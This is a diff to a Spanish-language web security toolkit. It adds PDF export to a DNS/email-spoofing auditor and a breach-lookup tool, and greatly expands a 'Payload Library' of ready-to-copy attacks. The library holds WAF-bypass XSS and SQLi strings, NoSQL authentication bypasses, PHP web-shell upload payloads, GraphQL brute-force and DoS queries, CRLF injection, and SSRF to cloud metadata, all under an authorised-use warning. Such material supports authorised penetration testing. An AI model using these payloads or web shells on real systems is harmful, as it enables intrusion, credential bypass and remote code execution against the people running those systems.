@@ -4032,11 +4032,24 @@ html.tab-hidden *, html.tab-hidden *::before, html.tab-hidden *::after{ animatio
 #breach .br-pwned-txt>b{display:block;font-family:var(--disp,"Orbitron");font-size:17px;letter-spacing:2px;color:var(--acc,#ff1a2e);text-shadow:0 0 12px rgba(255,26,46,.6);margin-bottom:7px;}
 #breach .br-leak-list{font-size:10px;color:var(--muted,#8b899c);line-height:2;}
 #breach .br-leak-chip{display:inline-block;font-family:var(--mono);font-size:10px;color:#fff;background:rgba(255,26,46,.16);border:1px solid rgba(255,26,46,.5);border-radius:4px;padding:2px 9px;margin:2px 5px 2px 0;letter-spacing:.04em;text-shadow:0 0 6px rgba(255,26,46,.4);}
+.br-cat-row{width:100%;display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin:-2px 0 12px;padding:10px 12px;background:rgba(226,87,26,.06);border:1px solid rgba(226,87,26,.28);border-radius:6px;}.br-cat-row .br-cat-lbl{font-family:var(--mono);font-size:9px;letter-spacing:.14em;color:#e2906b;text-transform:uppercase;margin-right:6px;}.br-cat-chip{display:inline-block;font-family:var(--mono);font-size:10px;color:#ffd7b0;background:rgba(226,87,26,.16);border:1px solid rgba(226,87,26,.55);border-radius:4px;padding:2px 9px;letter-spacing:.03em;}.br-cat-chip.sev{color:#fff;background:rgba(255,26,46,.2);border-color:rgba(255,26,46,.6);text-shadow:0 0 6px rgba(255,26,46,.4);}
 #breach .br-rowskull{margin-right:5px;filter:drop-shadow(0 0 4px rgba(255,26,46,.7));}
 #taint .tr-conf{display:inline-block;font-family:var(--mono);font-size:8px;font-weight:700;letter-spacing:.06em;padding:1px 6px;border-radius:3px;text-transform:uppercase;vertical-align:middle;}
 #taint .tr-conf-alta{background:rgba(255,26,46,.16);color:#ff6b7d;border:1px solid rgba(255,26,46,.5);}
 #taint .tr-conf-media{background:rgba(255,176,32,.14);color:var(--amber,#ffb020);border:1px solid rgba(255,176,32,.45);}
 #taint .tr-conf-baja{background:rgba(79,195,247,.12);color:#4fc3f7;border:1px solid rgba(79,195,247,.45);}
+/* ── Payload Library: advertencia + riesgo + cards ── */
+#payloads .pay-warn{display:flex;gap:14px;align-items:flex-start;background:linear-gradient(100deg,rgba(255,26,46,.12),rgba(255,26,46,.02));border:1px solid rgba(255,26,46,.45);border-left:4px solid var(--acc,#ff1a2e);border-radius:8px;padding:14px 18px;margin-bottom:26px;max-width:860px;box-shadow:0 0 24px rgba(255,26,46,.1);}
+#payloads .pay-warn-ico{font-size:26px;line-height:1;animation:brSkull 1.4s ease-in-out infinite;}
+#payloads .pay-warn-txt b{color:var(--acc,#ff1a2e);font-family:var(--disp,"Orbitron");letter-spacing:1px;font-size:13px;}
+#payloads .pay-warn-txt p{margin:6px 0 0;font-size:11.5px;color:rgba(240,238,248,.7);line-height:1.6;}
+#payloads .pay-warn-txt u{color:#fff;}
+#payloads .pay-risk{display:inline-block;font-family:var(--mono);font-size:8px;font-weight:700;letter-spacing:.06em;padding:1px 6px;border-radius:3px;background:var(--acc,#ff1a2e);color:#fff;text-transform:uppercase;vertical-align:middle;margin-left:4px;}
+#payloads .pay-card{transition:transform .2s,box-shadow .2s,border-color .2s;}
+#payloads .pay-card:hover{transform:translateY(-3px);box-shadow:0 10px 36px rgba(255,26,46,.14);}
+#payloads .pay-card.pay-danger{border-color:rgba(255,26,46,.4)!important;box-shadow:inset 0 0 0 1px rgba(255,26,46,.12);}
+#payloads .pay-card.pay-danger:hover{box-shadow:0 10px 40px rgba(255,26,46,.3);}
+#payloads .pay-card.pay-danger .pay-code{border-left:2px solid var(--acc,#ff1a2e);}
 #breach .br-recent{display:inline-block;margin-left:8px;font-family:var(--mono);font-size:8px;font-weight:700;letter-spacing:.1em;color:#001b10;background:var(--green,#00ffa3);border-radius:3px;padding:1px 6px;vertical-align:middle;box-shadow:0 0 10px rgba(0,255,163,.5);text-transform:uppercase;animation:brRecentPulse 1.6s ease-in-out infinite;}
 @keyframes brRecentPulse{0%,100%{box-shadow:0 0 8px rgba(0,255,163,.4);}50%{box-shadow:0 0 16px rgba(0,255,163,.8);}}
 @media (prefers-reduced-motion:reduce){#breach .br-recent{animation:none!important;}}
@@ -4212,7 +4225,9 @@ html.tab-hidden *, html.tab-hidden *::before, html.tab-hidden *::after{ animatio
       caa:      doh(domain, 'CAA').then(function(j){ return answers(j,257).map(function(a){return txt(a.data);}); }).catch(function(){return [];}),
       mtasts:   doh('_mta-sts.' + domain, 'TXT').then(function(j){ return answers(j,16).map(function(a){return txt(a.data);}).filter(function(s){return /v=STSv1/i.test(s);}); }).catch(function(){return [];}),
       tlsrpt:   doh('_smtp._tls.' + domain, 'TXT').then(function(j){ return answers(j,16).map(function(a){return txt(a.data);}).filter(function(s){return /v=TLSRPTv1/i.test(s);}); }).catch(function(){return [];}),
-      bimi:     doh('default._bimi.' + domain, 'TXT').then(function(j){ return answers(j,16).map(function(a){return txt(a.data);}).filter(function(s){return /v=BIMI1/i.test(s);}); }).catch(function(){return [];})
+      bimi:     doh('default._bimi.' + domain, 'TXT').then(function(j){ return answers(j,16).map(function(a){return txt(a.data);}).filter(function(s){return /v=BIMI1/i.test(s);}); }).catch(function(){return [];}),
+      cname:    doh('www.' + domain, 'CNAME').then(function(j){ return answers(j,5).map(function(a){return txt(a.data);}); }).catch(function(){return [];}),
+      soa:      doh(domain, 'SOA').then(function(j){ return answers(j,6).map(function(a){return txt(a.data);}); }).catch(function(){return [];})
     };
     var keys = Object.keys(jobs);
     return Promise.all(keys.map(function(k){ return jobs[k]; })).then(function(vals){
@@ -4283,6 +4298,34 @@ html.tab-hidden *, html.tab-hidden *::before, html.tab-hidden *::after{ animatio
     return s.replace(/^www\./,'').replace(/\/.*$/,'');
   }
 
+  var dasLast = null;
+  function dasExportPDF(){
+    if(!dasLast || typeof tsReportPDF !== 'function'){ return; }
+    var lc = function(l){ return l==='ok'?'#1a8f3c':l==='warn'?'#c98a00':l==='bad'?'#c4001a':'#7b4fff'; };
+    var rows = dasLast.items.map(function(it){
+      var name = it[0], r = it[1] || {};
+      return [ name,
+        { html:true, text:'<b style="color:'+lc(r.level)+'">'+esc(r.status||'')+'</b>' },
+        { html:true, text:(r.record?'<code style="font-size:9px;color:#1a6e2e">'+esc(String(r.record))+'</code><br>':'')+'<span style="color:#555">'+esc(r.note||'')+'</span>' } ];
+    });
+    var v = dasLast.v;
+    tsReportPDF({
+      title:'Email Spoofing & DNS Auditor — '+dasLast.domain,
+      subtitle:'Postura DNS y autenticación de correo · SPF · DMARC · DKIM · DNSSEC · MTA-STS · TLS-RPT · BIMI · CAA · subdomain takeover',
+      engine:'DNS Auditor v1.0 (DNS-over-HTTPS)',
+      target:dasLast.domain,
+      verdict:v.title+'  ·  Security Score '+v.score+'/100',
+      verdictColor:(v.level==='ok'?'#1a8f3c':v.level==='warn'?'#c98a00':'#ff1a2e'),
+      stats:[
+        { label:'Security Score', value:v.score+'/100', color:'#ff1a2e' },
+        { label:'Suplantable', value:(v.spoofable===false?'NO':v.spoofable==='parcial'?'PARCIAL':'SÍ'), color:(v.spoofable===false?'#1a8f3c':'#ff1a2e') },
+        { label:'Controles', value:dasLast.items.length, color:'#444' }
+      ],
+      columns:['Registro / Control','Estado','Detalle'],
+      rows:rows,
+      footer:'Auditoría pasiva vía DoH — no se envió ningún correo ni se tocó el servidor del objetivo.'
+    });
+  }
   function run(){
     var rawInput = (($('dasDomain')||{}).value || '').trim();
     var domain = cleanDomain(rawInput);
@@ -4364,11 +4407,16 @@ html.tab-hidden *, html.tab-hidden *::before, html.tab-hidden *::after{ animatio
       if(extra.bimi.length)   infra.push(['BIMI',{level:'info',status:'PRESENTE',record:extra.bimi[0],note:'Logo de marca verificado (requiere DMARC en enforcement).'}]);
       if(extra.ns.length)     infra.push(['NS',{level:'info',status:extra.ns.length+' SERVIDORES',record:extra.ns.join(', '),note:'Servidores autoritativos del dominio.'}]);
       if(ips.length)          infra.push(['A / AAAA',{level:'info',status:ips.length+' IP(S)',record:ips.join(', '),note:'Registros de dirección del dominio raíz.'}]);
+      if(extra.cname && extra.cname.length){ var _cn=extra.cname.join(', '); var _to=/github\.io|herokuapp|s3[.-]|amazonaws|azurewebsites|cloudfront|netlify|ghost\.io|wordpress\.com|zendesk|fastly|pantheon|readthedocs|surge\.sh|bitbucket\.io|myshopify|shopify|unbounce|helpscout|cargocollective|statuspage/i.test(_cn); infra.push(['CNAME (www)', {level:_to?'bad':'info', status:_to?'⚠ TAKEOVER-PRONE':'presente', record:_cn, note:_to?'www apunta a un servicio tomable — si el recurso no está reclamado = SUBDOMAIN TAKEOVER.':'Alias del subdominio www.'}]); }
+      if(extra.soa && extra.soa.length) infra.push(['SOA',{level:'info',status:'presente',record:String(extra.soa[0]).slice(0,90),note:'Registro de autoridad de la zona DNS.'}]);
       var infraOk = infra.reduce(function(a,x){return a+okc(x[1]);},0);
       var infraHtml = infra.map(function(x){return card(x[0],x[1]);}).join('');
       html += grp('Infraestructura DNS', infraOk, infra.length, infraHtml);
 
+      dasLast = { domain: domain, v: v, items: mail.concat(infra) };
+      html = '<div style="display:flex;justify-content:flex-end;margin-bottom:10px"><button id="dasPDF" class="das-btn" style="padding:9px 18px;font-size:12px;background:linear-gradient(90deg,#ff1a2e,#c2101f)">📄 REPORTE PDF</button></div>' + html;
       $('dasResults').innerHTML = html;
+      var _pb = $('dasPDF'); if(_pb) _pb.addEventListener('click', dasExportPDF);
 
       log('[=] Security Score: ' + v.score + '/100 (' + g + ') — ' + v.title, v.level==='ok'?'lg':v.level==='warn'?'la':'lr');
       log('root@breachradar:~# ', 'lg');
@@ -5594,7 +5642,14 @@ dig assets.lime.bike CNAME</div></div></div>
   <div class="wrap">
     <div class="sec-num reveal-wrap"><div class="reveal-inner">22 — Arsenal Ofensivo</div></div>
     <h2 class="sec-title h2-anim" data-l1="Payload" data-l2="Library." aria-label="Payload Library."></h2>
-    <p style="margin-bottom:32px;color:rgba(240,238,248,.6);max-width:720px;">Payloads listos para usar en todas las vulnerabilidades: desde los más básicos hasta los más ofuscados para bypass de WAF y filtros.</p>
+    <p style="margin-bottom:20px;color:rgba(240,238,248,.6);max-width:740px;">Arsenal de payloads listos para copiar: desde los más básicos hasta los <b style="color:var(--acc)">avanzados ofuscados y doble-encodeados</b> para bypass de WAF y filtros. Cada payload trae su contexto de uso.</p>
+    <div class="pay-warn">
+      <span class="pay-warn-ico">⚠️</span>
+      <div class="pay-warn-txt">
+        <b>ADVERTENCIA — Payloads potencialmente peligrosos</b>
+        <p>Varios de estos payloads pueden provocar <b>ejecución de código, exfiltración de datos o daño real</b> en un sistema. Úsalos <u>EXCLUSIVAMENTE</u> sobre objetivos donde tengas <b>autorización explícita por escrito</b> (programas de bug bounty activos o pentests contratados). El uso no autorizado es un <b>delito informático</b>. Los marcados con <span class="pay-risk">⚠ alto</span> son especialmente destructivos.</p>
+      </div>
+    </div>
     <div class="pay-dd-wrap">
       <label for="pay-select" class="pay-dd-label">📂 Categoría de payload:</label>
       <select id="pay-select" class="pay-dd"></select>
@@ -13605,6 +13660,11 @@ var PAY_CATS = [
  {id:'idor',   label:'IDOR / BOLA'},
  {id:'csrf',   label:'CSRF'},
  {id:'redir',  label:'Header Injection'},
+ {id:'adv',    label:'🔥 Avanzados / WAF Bypass'},
+ {id:'nosql',  label:'NoSQL Injection'},
+ {id:'upload', label:'File Upload'},
+ {id:'graphql',label:'GraphQL'},
+ {id:'crlf',   label:'CRLF / Header Inj'},
 ];
 
 var PAYLOADS = {
@@ -13849,6 +13909,62 @@ var PAYLOADS = {
  {label:'Web cache deception', pay:'/account/settings/nonexistent.css',                 note:'CDN/cache cachea la respuesta HTML como si fuera un asset estatico por la extension'},
  {label:'HTTP Response Splitting', pay:'/redirect?url=http://ok.com%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK',  note:'Inyecta una respuesta HTTP completa falsa cuando el input no se sanea antes de un header'},
  ],
+ adv:[
+ {label:'Doble URL-encode XSS', pay:'%253Cscript%253Ealert(1)%253C%252Fscript%253E', note:'<script>alert(1)<\/script> codificado DOS veces — bypassa WAFs que decodifican una sola vez', risk:'alto'},
+ {label:'Doble URL-encode SQLi', pay:'%2527%2520OR%25201%253D1--', note:"' OR 1=1-- doble-encodeado — el backend decodifica 2 veces antes de parsear", risk:'alto'},
+ {label:'Triple encode traversal', pay:'%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd', note:'../../ con triple URL-encode — para proxies/CDN en cadena', risk:'alto'},
+ {label:'HTML entity decimal', pay:'&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;', note:'Todo el tag en entidades decimales — evita matching por string', risk:'alto'},
+ {label:'HTML entity hex', pay:'&#x3c;img src=x onerror=&#x61;lert(1)&#x3e;', note:'Entidades hexadecimales mezcladas — el navegador las decodifica', risk:'alto'},
+ {label:'Unicode escape JS', pay:'<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>', note:'alert escrito con escapes unicode — bypass de filtros de keyword', risk:'alto'},
+ {label:'UTF-7 XSS', pay:'+ADw-script+AD4-alert(1)+ADw-/script+AD4-', note:'XSS en UTF-7 — funciona si el charset no está fijado (IE legacy / misconfig)', risk:'alto'},
+ {label:'Nested tag bypass', pay:'<scr<script>ipt>alert(1)</scr<\/script>ipt>', note:'El filtro que ELIMINA <script> reconstruye uno válido al quitar el del medio', risk:'alto'},
+ {label:'fromCharCode', pay:'<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>', note:'alert(1) como códigos de carácter — sin la palabra alert', risk:'alto'},
+ {label:'Base64 anidado', pay:'<img src=x onerror=eval(atob(atob("WVd4bGNuUW9NU2s9")))>', note:'base64 DOBLE — se decodifica dos veces antes de ejecutar', risk:'alto'},
+ {label:'Overlong UTF-8 dot', pay:'..%c0%af..%c0%afetc%c0%afpasswd', note:'%c0%af = "/" en UTF-8 overlong — bypass de filtros de ../', risk:'alto'},
+ {label:'Null byte truncation', pay:'../../../etc/passwd%00.png', note:'%00 trunca la extensión en lenguajes legacy (PHP<5.3.4)', risk:'alto'},
+ {label:'SQLi comentario versionado', pay:"/*!50000UNION*/ /*!50000SELECT*/ username,password FROM users-- -", note:'MySQL ejecuta el comentario /*! */ — invisible para muchos WAF', risk:'alto'},
+ {label:'SQLi sin espacios', pay:"'/**/UNION/**/SELECT/**/NULL,version()/**/FROM/**/dual-- -", note:'Comentarios como separador — bypass de bloqueo de espacios', risk:'alto'},
+ {label:'SQLi paréntesis', pay:"'UNION(SELECT(username),(password)FROM(users))-- -", note:'Paréntesis en vez de espacios — otro bypass clásico', risk:'alto'},
+ {label:'SQLi doble-encode UNION', pay:'%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554', note:'UNION SELECT doble-URL-encoded carácter por carácter', risk:'alto'},
+ {label:'Case + encode mix', pay:'%3CsCrIpT%3EaLeRt(1)%3C%2FsCrIpT%3E', note:'Case-mixing + URL-encode combinados', risk:'alto'},
+ {label:'Data URI base64', pay:'<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></iframe>', note:'HTML completo en data: URI base64 dentro de un iframe', risk:'alto'},
+ {label:'JS void + unicode', pay:'javascript:/*--></title></style></textarea><\/script><svg/onload=alert()>', note:'Poliglota que rompe múltiples contextos a la vez', risk:'alto'},
+ {label:'Bypass \\x hex', pay:'<img src=x onerror="eval(\'\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\')">', note:'alert(1) en escapes hexadecimales \\x', risk:'alto'},
+ ],
+ nosql:[
+ {label:'Auth bypass $ne', pay:'{"user":{"$ne":null},"pass":{"$ne":null}}', note:'$ne null hace que cualquier credencial sea verdadera (Mongo)', risk:'alto'},
+ {label:'Auth bypass $gt', pay:'{"user":"admin","pass":{"$gt":""}}', note:'$gt "" matchea cualquier contraseña del usuario admin', risk:'alto'},
+ {label:'Operador en query string', pay:'user[$ne]=0&pass[$ne]=0', note:'Mismo bypass pero vía parámetros x-www-form-urlencoded', risk:'alto'},
+ {label:'$where JS injection', pay:'{"$where":"this.password == this.user || true"}', note:'$where ejecuta JS en el servidor Mongo — equivale a eval', risk:'alto'},
+ {label:'$regex extraction', pay:'{"user":"admin","pass":{"$regex":"^a"}}', note:'Blind: inferir la contraseña carácter por carácter con regex', risk:'alto'},
+ {label:'Array injection', pay:'user=admin&pass[$in][]=a&pass[$in][]=b', note:'$in con array prueba varios valores a la vez', risk:'alto'},
+ {label:'JS sleep (time-based)', pay:'{"$where":"sleep(5000)"}', note:'Blind time-based en Mongo via $where', risk:'alto'},
+ ],
+ upload:[
+ {label:'PHP doble extensión', pay:'shell.php.jpg', note:'Apache mal configurado ejecuta .php aunque termine en .jpg', risk:'alto'},
+ {label:'Null byte extensión', pay:'shell.php%00.jpg', note:'Trunca en la extensión real .php (stacks legacy)', risk:'alto'},
+ {label:'MIME spoofing', pay:'Content-Type: image/png  (archivo = <?php system($_GET[0]); ?>)', note:'Cambiar el Content-Type para pasar validación de MIME', risk:'alto'},
+ {label:'Magic bytes GIF', pay:'GIF89a;<?php system($_GET["c"]); ?>', note:'Empezar con bytes mágicos GIF para pasar getimagesize()', risk:'alto'},
+ {label:'.htaccess override', pay:'AddType application/x-httpd-php .jpg', note:'Subir .htaccess que hace ejecutar .jpg como PHP', risk:'alto'},
+ {label:'SVG con script', pay:'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>', note:'SVG ejecuta JS al abrirse — XSS stored vía upload', risk:'alto'},
+ {label:'Path traversal en nombre', pay:'../../../../var/www/html/shell.php', note:'Nombre de archivo con ../ para escapar del directorio de uploads', risk:'alto'},
+ {label:'Extensión poco común', pay:'shell.phtml / shell.php5 / shell.pht', note:'Extensiones alternativas que el servidor ejecuta pero el filtro no bloquea', risk:'alto'},
+ ],
+ graphql:[
+ {label:'Introspección completa', pay:'{__schema{types{name,fields{name,type{name}}}}}', note:'Volcar todo el esquema GraphQL — reconocimiento total de la API'},
+ {label:'Alias batching', pay:'{a:login(u:"x",p:"1"){t} b:login(u:"x",p:"2"){t} c:login(u:"x",p:"3"){t}}', note:'Brute-force por batching de alias en una sola request', risk:'alto'},
+ {label:'Field suggestion', pay:'{user{passwrd}}', note:'Los mensajes de error "did you mean password?" filtran campos ocultos'},
+ {label:'Deep recursion DoS', pay:'{a{b{a{b{a{b{a{b...}}}}}}}}', note:'Consulta anidada profunda para agotar recursos (DoS)', risk:'alto'},
+ {label:'IDOR vía node(id)', pay:'{node(id:"VXNlcjox"){... on User{email}}}', note:'IDs base64 predecibles → acceso a objetos de otros usuarios', risk:'alto'},
+ {label:'Mutation sin auth', pay:'mutation{updateUser(id:2,role:"admin"){id}}', note:'Probar mutations sensibles sin token de autorización', risk:'alto'},
+ ],
+ crlf:[
+ {label:'CRLF header injection', pay:'%0d%0aSet-Cookie:sessionid=attacker', note:'Inyecta un header Set-Cookie si el input va a un header sin sanear', risk:'alto'},
+ {label:'CRLF → XSS', pay:'%0d%0a%0d%0a<script>alert(1)<\/script>', note:'Doble CRLF corta los headers e inyecta body HTML → XSS', risk:'alto'},
+ {label:'Response splitting', pay:'%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a', note:'Inyecta una segunda respuesta HTTP completa (cache poisoning)', risk:'alto'},
+ {label:'Log injection', pay:'admin%0d%0a[INFO] Usuario admin autenticado OK', note:'Falsifica entradas en logs si el input se loguea sin escapar'},
+ {label:'Host header SSRF', pay:'Host: 169.254.169.254', note:'Cambiar el Host para apuntar a metadata interna (SSRF)', risk:'alto'},
+ ],
 };
 
 var activePay = 'xss';
@@ -13882,11 +13998,11 @@ function renderPayCards(){
  payGrid.innerHTML = '';
  items.forEach(function(p, i){
  var card = document.createElement('div');
- card.className = 'pay-card';
+ card.className = 'pay-card' + (p.risk ? ' pay-danger' : '');
  card.style.animation = 'cardIn 0.35s '+(i*0.04)+'s cubic-bezier(.22,1,.36,1) both';
  card.innerHTML =
  '<div class="pay-card-head">'
- + '<span class="pay-card-label">'+p.label+'</span>'
+ + '<span class="pay-card-label">'+p.label+(p.risk ? ' <span class="pay-risk">\u26A0 '+p.risk+'</span>' : '')+'</span>'
  + '<button class="pay-copy-btn" title="Copiar">\u29C9 Copiar</button>'
  + '</div>'
  + '<div class="pay-code">'+p.pay.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</div>'
@@ -28997,6 +29113,48 @@ function brParseAnalytics(j){
   out.categories = Array.from(new Set(out.categories));
   return out;
 }
+/* ── v4.1 — REPORTE PDF del Breach Radar (print-to-PDF, tema TudelaSec) ── */
+function brExportPDF(email, parsed, risk, worst, yrs){
+  if(typeof tsReportPDF !== "function"){ brLog("hit","[x] El generador de PDF no está disponible"); return; }
+  var breaches = parsed.breaches || [];
+  var an = parsed.analytics || {};
+  var sevColor = function(n){ return n>=70?"#ff1a2e":n>=40?"#e2571a":"#c98a00"; };
+  var rows = breaches.map(function(b){
+    var sv = (typeof brSeverity==="function") ? brSeverity(b) : 0;
+    var yr = String(b.date||"").slice(0,4) || "—";
+    var recent = (parseInt(yr,10)||0) >= 2023;
+    var cls = (b.classes||[]).slice(0,12).join(", ") || "—";
+    return [
+      { html:true, text:"<b>"+esc(String(b.name||"?"))+"</b>"+(b.verified?" <small style=\"color:#1a8f3c\">&#10003; verificada</small>":"") },
+      { html:true, text:esc(yr)+(recent?" <span class=\"sev\" style=\"background:#ff1a2e\">RECIENTE</span>":"") },
+      (b.pwn ? b.pwn.toLocaleString("es-CL") : "—"),
+      { html:true, text:"<span class=\"sev\" style=\"background:"+sevColor(sv)+"\">"+sv+"/100</span>" },
+      cls
+    ];
+  });
+  var vcolor = risk>=70?"#ff1a2e":risk>=40?"#e2571a":"#1a8f3c";
+  var stats = [
+    {label:"Filtraciones", value:breaches.length, color:"#ff1a2e"},
+    {label:"Riesgo exposición", value:risk+"/100", color:vcolor},
+    {label:"Peor brecha", value:(worst?worst.score+"/100":"—"), color:"#e2571a"},
+    {label:"Años en la calle", value:(yrs===null?"—":yrs.toFixed(1)), color:"#444"}
+  ];
+  if(an.pastes) stats.push({label:"Pastes", value:an.pastes, color:"#c98a00"});
+  if(an.categories && an.categories.length) stats.push({label:"Tipos de dato", value:an.categories.length, color:"#8a6bff"});
+  var verdict = "CORREO FILTRADO · "+breaches.length+" brecha(s) · RIESGO "+risk+"/100"+(an.riskLabel?"  ·  XposedOrNot: "+an.riskLabel:"");
+  var footer = (an.categories && an.categories.length) ? "Categorías de datos expuestos ("+an.categories.length+"): "+an.categories.join(", ")+"." : "Sin desglose de categorías disponible para este correo.";
+  tsReportPDF({
+    title:"Breach Radar — Exposición de Credenciales",
+    subtitle:"Chequeo multi-fuente (XposedOrNot · breach-analytics · LeakCheck) del correo auditado — ordenado de la filtración más reciente a la más antigua",
+    engine:"Breach Radar v4.1",
+    target:email,
+    verdict:verdict, verdictColor:vcolor,
+    stats:stats,
+    columns:["Filtración","Año","Cuentas afectadas","Severidad","Datos expuestos"],
+    rows:rows,
+    footer:footer
+  });
+}
 /* ── v2.2: 2ª fuente real de brechas (LeakCheck API pública, sin key) ── */
 function brParseLeakCheck(j){
   if(!j || typeof j !== "object" || j.success !== true) return null;
@@ -29209,11 +29367,26 @@ async function brRun(){
         var _chips = _leakNames.slice(0,40).map(function(n){ return '<span class="br-leak-chip">'+esc(n)+'</span>'; }).join('');
         var _moreLeaks = _leakNames.length>40 ? ' +'+(_leakNames.length-40)+' más' : '';
         var _pwnBanner = '<div class="br-pwned-banner"><span class="br-skull">💀</span><div class="br-pwned-txt"><b>CORREO FILTRADO</b><div class="br-leak-list">Filtrado en '+_leakNames.length+' brecha(s): '+_chips+_moreLeaks+'</div></div></div>';
-        summ.innerHTML = _pwnBanner + '<div class="br-stat c"><b>'+parsed.breaches.length+'</b><span>FILTRACIONES</span></div>'+
+        var _an = parsed.analytics || {};
+        var _cats = _an.categories || [];
+        var _catRow = "";
+        if(_cats.length){
+          var _cc = _cats.slice(0,24).map(function(c){ return '<span class="br-cat-chip">'+esc(c)+'</span>'; }).join("");
+          var _cm = _cats.length>24 ? '<span class="br-cat-chip sev">+'+(_cats.length-24)+' más</span>' : "";
+          _catRow = '<div class="br-cat-row"><span class="br-cat-lbl">⚠ Datos expuestos</span>'+_cc+_cm+'</div>';
+        }
+        var _xtra = "";
+        if(_an.pastes) _xtra += '<div class="br-stat c"><b>'+_an.pastes+'</b><span>PASTES (TEXTO CRUDO)</span></div>';
+        if(_an.riskLabel) _xtra += '<div class="br-stat c"><b>'+esc(String(_an.riskLabel))+'</b><span>VEREDICTO XPOSEDORNOT</span></div>';
+        summ.innerHTML = _pwnBanner + _catRow + '<div class="br-stat c"><b>'+parsed.breaches.length+'</b><span>FILTRACIONES</span></div>'+
           '<div class="br-stat c"><b>'+risk+'/100</b><span>RIESGO DE EXPOSICIÓN</span></div>'+
           '<div class="br-stat c"><b>'+(worst?esc(worst.name):"—")+'</b><span>PEOR FILTRACIÓN ('+(worst?worst.score:0)+'/100)</span></div>'+
           '<div class="br-stat c"><b>'+(yrs!==null?yrs.toFixed(1)+" AÑOS":"—")+'</b><span>EN LA CALLE</span></div>'+
+          _xtra +
+          '<button class="br-export" id="brPDF">📄 REPORTE PDF</button>'+
           '<button class="br-export" id="brExport">⬇ EXPORT JSON</button>';
+        var _pb = document.getElementById("brPDF");
+        if(_pb) _pb.onclick = function(){ brExportPDF(input, parsed, risk, worst, yrs); };
         var ex = document.getElementById("brExport");
         if(ex) ex.onclick = function(){
           var blob = new Blob([JSON.stringify({ tool:"TudelaSec Breach Radar", email:input, date:new Date().toISOString(), risk:risk, worstBreach:worst, yearsExposed:(yrs===null?null:Number(yrs.toFixed(1))), breaches:parsed.breaches, severity:parsed.breaches.map(function(b){ return { name:b.name, severity:brSeverity(b) }; }), timeline:tl, hardeningPlan:plan }, null, 2)], { type:"application/json" });
